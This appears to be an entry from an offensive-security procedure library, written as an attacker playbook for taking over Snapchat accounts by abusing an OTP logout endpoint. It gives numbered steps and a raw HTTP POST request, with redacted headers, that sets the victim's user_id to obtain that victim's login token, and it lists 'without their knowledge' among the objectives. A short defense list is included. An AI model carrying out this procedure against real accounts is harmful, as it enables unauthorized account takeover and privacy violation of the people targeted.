---
tags:
  - otp-bypass
  - improper-authentication
  - snapchat
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Python-Script-for-Snapchat-API-Automation]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/snapchat-logout-otp-request]]'
  - '[[commands/snapchat-otp-login-request]]'
platforms:
  - Web
  - Cloud (GCP)
  - Mobile (Android)
techniques:
  - '[[Valid Accounts]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 6d5bda8c-01ba-43a2-8d07-9e0def3f9185
created_at: '2025-12-11T06:10:40.171Z'
updated_at: '2025-12-11T06:10:40.171Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
mitre_techniques:
  - '[[T1078]]'
---
# Manipulate Snapchat Logout Endpoint to Obtain Victim OTP

## Summary

This procedure involves manipulating the user_id parameter in Snapchat's OTP logout endpoint to force the generation of an OTP token for a victim user, exploiting improper authentication validation.

## Description

The /scauth/otp/droid/logout endpoint trusts the provided user_id without checking it against the authenticated session, allowing an attacker to specify any user's ID and receive a valid OTP token. This can be done while logged in as the attacker, and the token is then used for login. The target environment is Snapchat's API on GCP, typically accessed via mobile or web clients. Expected outcome is obtaining a usable OTP token for account takeover.

## Requirements

1. Attacker's Snapchat account credentials for initial login
2. Victim's user_id (obtainable from friend requests)
3. Network access to gcp.api.snapchat.com
4. Tools: [[tools/Burp-Suite]] for request manipulation or [[tools/Python-Script-for-Snapchat-API-Automation]] for automation

## Defense

Defensive measures and detection strategies:

- Implement proper validation of user_id against authenticated session
- Monitor API logs for anomalous logout requests with mismatched user_ids
- Rate limit OTP generation per IP or device

## Objectives

1. Obtain OTP token for victim without their knowledge
2. Enable subsequent login as victim
3. Demonstrate improper authentication vulnerability

## Instructions

### Step 1: Login as Attacker

**Context**: Establish an authenticated session with the attacker's credentials.

Perform normal login via Snapchat API to get session tokens.

> This sets up headers like X-Snapchat-Client-Auth.

### Step 2: Send Manipulated Logout Request

**Context**: Manipulate the request to target the victim's user_id and obtain OTP.

**Command** ([[commands/snapchat-logout-otp-request]]):
```http
POST /scauth/otp/droid/logout HTTP/1.1
Host: gcp.api.snapchat.com
Connection: close
Content-Length: 168
X-Snapchat-Client-Auth: ██████
X-Snapchat-UUID: ███
x-snapchat-userid: █████
username: ███
req_token: █████████
timestamp: 1594604280000
Accept: application/json
User-Agent: Snapchat/10.78.1.0 █████
Accept-Language: en-GB;q=1, en;q=0.9
Content-Type: application/json; charset=utf-8
Accept-Encoding: gzip, deflate

{"user_id":"████","device_id":"███████","device_name":"███████"}
```

> Set user_id to victim's ID; expect JSON response with token.

### Step 3: Extract OTP Token

**Context**: Parse the response to get the token.

Capture the response in [[tools/Burp-Suite]] and extract the 'token' field.

> Ensure token is valid and not expired.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques

- None

## Commands Used

- [[commands/snapchat-logout-otp-request]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/Python-Script-for-Snapchat-API-Automation]]

## Tags

- [[otp-bypass]]
- [[improper-authentication]]
